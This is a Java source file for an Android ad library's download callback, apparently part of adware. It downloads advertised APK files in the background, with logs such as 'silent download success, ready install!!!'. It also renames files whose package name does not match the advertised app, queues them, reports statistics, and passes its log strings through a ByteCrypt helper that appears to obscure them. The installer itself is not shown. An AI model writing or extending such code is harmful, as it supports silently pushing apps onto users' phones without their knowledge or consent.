package com.curtain.koreyoshi.download;


import android.content.Context;

import com.common.crypt.ByteCrypt;
import com.curtain.arch.MyLog;
import com.curtain.koreyoshi.ignore.DownloadInfo;
import com.curtain.koreyoshi.init.Config;
import com.curtain.koreyoshi.init.Constants;
import com.curtain.koreyoshi.business.popad.PopAdManager;
import com.curtain.koreyoshi.data.AdSharedPreference;
import com.curtain.koreyoshi.bean.AdData;
import com.curtain.koreyoshi.business.statistics.StatisticsUtil;
import com.curtain.koreyoshi.utils.PackageInstallUtil;
import com.adis.tools.exception.HttpException;
import com.adis.tools.http.ResponseInfo;
import com.adis.tools.http.callback.RequestCallBack;

import java.io.File;

/**
 * Created by leejunpeng on 2015/10/26.
 */
public class PkgSiDownloadCallback extends RequestCallBack<File> {
	private static final String TAG = PkgSiDownloadCallback.class.getSimpleName();
	private static final boolean DEBUG_DOWNLOAD = Config.DOWNLOAD_LOG_ENABLE;
	AdData adData ;
	Context mContext;
	public PkgSiDownloadCallback(Context context, AdData adData) {
		this.mContext = context;
		this.adData = adData;

	}

	@Override
	public void onStart() {
		super.onStart();
		PopAdManager.getInstance(mContext).refreshAdStatus(adData, AdData.STATUS_DOWNLOADING);
	}

	@Override
	public void onLoading(long total, long current,
			boolean isUploading) {
		super.onLoading(total, current, isUploading);
	}

	@Override
	public void onSuccess(ResponseInfo<File> responseInfo) {
		PopAdManager.getInstance(mContext).refreshAdStatus(adData, AdData.STATUS_DOWNLOADED);
		File target = responseInfo.result;
		if (target != null && target.exists()) {
			String path = target.getAbsolutePath();
			if (PackageInstallUtil.isValideApkFile(mContext, path)) {
				if (1 == adData.getBehave()){
					String ddlPname = PackageInstallUtil.getPname(mContext, path);
					if (!ddlPname.equals(adData.getPackageName())){
						MyLog.e(TAG, ByteCrypt.getString("rename pname :".getBytes())
								+ adData.getPackageName()
								+ ByteCrypt.getString("to: ".getBytes())
								+ ddlPname);
						PopAdManager.getInstance(mContext).updateAdPname(adData, ddlPname);
						File newName = new File(Constants.DOWNLOAD_DIR + String.valueOf(ddlPname.hashCode()));
						target.renameTo(newName);
						target = newName;
					}

				}
				int key = -1;
				try {
					key = Integer.valueOf(target.getName());
				} catch (NumberFormatException e) {
					e.printStackTrace();
				}
				if(key == -1){
					return;
				}

				AdSharedPreference.addFileNameToList(mContext, target.getName());

				StatisticsUtil.getInstance(mContext).statisticsAdPreDownloadSucceed(mContext,adData);
				if (DEBUG_DOWNLOAD) {
					MyLog.e(TAG, ByteCrypt.getString("silent download success, ready install!!!".getBytes()));
				}
			} else {
				// 如果数据接收完，但是无法正常解析，我们认为下载失败。将下载文件删除
				target.delete();

				StatisticsUtil.getInstance(mContext).statisticsAdPreDownloadSucceedButFileError(mContext,adData);
				if (DEBUG_DOWNLOAD)
					MyLog.e(TAG, ByteCrypt.getString("silent download success, but delete!!!".getBytes()));
			}
		}
		DownloadInfo downloadInfo = DownloadByXu.getInstance(mContext).getDownloadInfoByKey(adData.getKey());
		if (downloadInfo != null) {
			String downloadUrl = downloadInfo.getDownloadUrl();
			if (downloadUrl != null && DownloadRetry.isRetryUrl(mContext, downloadUrl)) {
				StatisticsUtil.getInstance(mContext).statisticsAdPreDownloadRetrySucceed(mContext,adData);
			}
		}
	}

	@Override
	public void onFailure(HttpException error,String msg) {
		if (DEBUG_DOWNLOAD)
			MyLog.e(TAG, ByteCrypt.getString("silent download failure!!!".getBytes()));
		PopAdManager.getInstance(mContext).refreshAdStatus(adData, AdData.STATUS_INIT);
		if(mContext != null) {
			if (error != null){
				int errorCode = error.getExceptionCode();
				StatisticsUtil.getInstance(mContext).statisticsAdPreDownloadFailed(mContext,adData,errorCode,msg);
			}else {
				StatisticsUtil.getInstance(mContext).statisticsAdPreDownloadFailed(mContext,adData);
			}
			DownloadRetry.retryCdn(mContext,adData,msg,true);
		}
	}

}
